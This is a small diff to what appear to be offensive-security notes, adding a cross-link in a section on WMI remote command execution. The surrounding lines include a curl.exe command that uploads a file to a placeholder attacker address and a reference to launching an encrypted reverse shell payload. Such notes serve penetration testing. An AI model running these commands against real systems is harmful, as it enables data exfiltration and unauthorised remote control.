@@ -162,6 +162,8 @@ curl.exe -X POST --upload-file <filepath> http://<ip>:<port>/<filename>
 
 ### WMI command execution
 
+Also see [[2 Tech-Specifics/OS/Windows/WMI|WMI]]
+
 To create the `$credential` object see [[#Create a PSCredential object]].
 
 As `<command>` e.g. launch an encrypted [[#Reverse Shell Payload]]
